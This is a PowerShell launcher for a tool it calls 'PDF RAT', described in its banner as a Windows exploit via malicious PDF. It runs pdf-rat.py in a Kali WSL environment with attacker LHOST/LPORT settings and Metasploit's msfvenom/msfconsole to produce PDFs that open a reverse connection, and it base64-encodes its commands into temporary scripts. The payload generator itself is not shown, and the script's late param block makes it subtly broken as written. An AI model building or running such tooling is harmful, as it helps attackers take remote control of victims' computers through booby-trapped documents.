#requires -Version 5.1

$Script:WslDistro = "kali-linux"
$Script:RootDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Script:KaliDir = "/mnt/c/TOOLS/pdf-rat/kali"

function Write-Info  { Write-Host "[*] $($args -join ' ')" -ForegroundColor Cyan }
function Write-Ok    { Write-Host "[+] $($args -join ' ')" -ForegroundColor Green }
function Write-Warn  { Write-Host "[!] $($args -join ' ')" -ForegroundColor Yellow }
function Write-Err   { Write-Host "[x] $($args -join ' ')" -ForegroundColor Red }

function Convert-PathToWsl {
    param([string]$WinPath)
    $wslPath = $WinPath -replace '^([A-Za-z]):\\', '/mnt/$1/'
    $wslPath = $wslPath -replace '\\', '/'
    return $wslPath.ToLower()
}

function Write-WslScript {
    param([string]$Content)
    $tmpFile = "/tmp/wsl_pdfrat_$(Get-Random).sh"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Content))
    wsl -d $Script:WslDistro -- bash -c "echo '$b64' | base64 -d > $tmpFile; chmod +x $tmpFile" 2>$null
    return $tmpFile
}

function Invoke-Wsl {
    param([string]$Command)
    $tmpFile = Write-WslScript $Command
    wsl -d $Script:WslDistro -- bash $tmpFile 2>$null
    $rc = $LASTEXITCODE
    wsl -d $Script:WslDistro -- bash -c "rm -f $tmpFile" 2>$null
    return $rc
}

function Invoke-WslCapture {
    param([string]$Command)
    $tmpFile = Write-WslScript $Command
    $outFile = "/tmp/wsl_pdfrat_out_$(Get-Random).txt"
    wsl -d $Script:WslDistro -- bash -c "$tmpFile > $outFile 2>/dev/null" 2>$null
    $result = wsl -d $Script:WslDistro -- bash -c "cat $outFile 2>/dev/null" 2>$null
    wsl -d $Script:WslDistro -- bash -c "rm -f $tmpFile $outFile" 2>$null
    return $result
}

function Test-WslReady {
    $kaliPath = Convert-PathToWsl "$Script:RootDir\kali"
    $result = Invoke-WslCapture "test -d $kaliPath && echo 'OK' || echo 'NO'"
    return $result -eq 'OK'
}

function Start-PdfRat {
    param(
        [string]$Lhost = "",
        [int]$Lport = 4444
    )

    Clear-Host
    Write-Host "===== PDF RAT v1.0 (via WSL Kali) =====" -ForegroundColor Red
    Write-Host "Windows 10+ Exploit via Malicious PDF" -ForegroundColor DarkGray
    Write-Host ""

    if (-not (Test-WslReady)) {
        Write-Err "Kali directory not found in WSL"
        Write-Err "Make sure $Script:WslDistro is installed and accessible"
        return
    }

    $kaliDir = Convert-PathToWsl "$Script:RootDir\kali"
    $pyScript = "$kaliDir/pdf-rat.py"

    Write-Info "Starting pdf-rat.py in WSL Kali..."
    Write-Info "Kali path: $kaliDir"

    # Check if reportlab is installed
    $check = Invoke-WslCapture "python3 -c 'import reportlab; print(\"OK\")' 2>/dev/null || echo 'NO'"
    if ($check -eq 'NO') {
        Write-Warn "reportlab not installed in WSL Kali. Installing..."
        Invoke-Wsl "pip install reportlab 2>/dev/null || pip3 install reportlab 2>/dev/null"
    }

    if ($Lhost) {
        Write-Info "Passing LHOST=$Lhost LPORT=$Lport"
        wsl -d $Script:WslDistro -- bash -c "cd $kaliDir && python3 pdf-rat.py --lhost $Lhost --lport $Lport 2>/dev/null"
    } else {
        wsl -d $Script:WslDistro -- bash -c "cd $kaliDir && python3 pdf-rat.py 2>/dev/null"
    }
}

function Show-Usage {
    @"
Usage:
  .\pdf-rat.ps1                  - Interactive mode
  .\pdf-rat.ps1 -Lhost 192.168.1.100 -Lport 4444  - Auto with LHOST/LPORT

Requirements:
  - WSL with Kali Linux installed
  - Metasploit framework (msfvenom, msfconsole)
  - Python 3 + pip
  - reportlab (auto-installed if missing)

Output files are in: .\kali\output\
"@
}

param(
    [string]$Lhost = "",
    [int]$Lport = 4444
)

Start-PdfRat -Lhost $Lhost -Lport $Lport
